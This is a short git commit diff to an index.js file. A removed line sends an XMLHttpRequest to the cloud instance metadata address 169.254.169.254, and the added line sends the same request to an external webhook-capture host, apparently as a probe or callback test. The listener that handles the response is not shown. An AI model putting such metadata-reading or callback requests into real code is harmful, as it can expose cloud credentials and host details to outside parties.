8ccd4114927f15c0f865a3668d34909eada69735
mhmh55516 <mhmh55516@gmail.com>
2021-04-27 18:34:27 +0200

    Update index.js

--- index.js
+++ index.js
@@ -9,5 +9,5 @@ function reqListener () {
 } 
 var oReq = new XMLHttpRequest(); 
 oReq.addEventListener("load", reqListener); 
-oReq.open("GET", "http://169.254.169.254/metadata/v1/maintenance"); 
+oReq.open("GET", "http://762202e9.proxy.webhookapp.com/metadata/v1/maintenance"); 
 oReq.send();
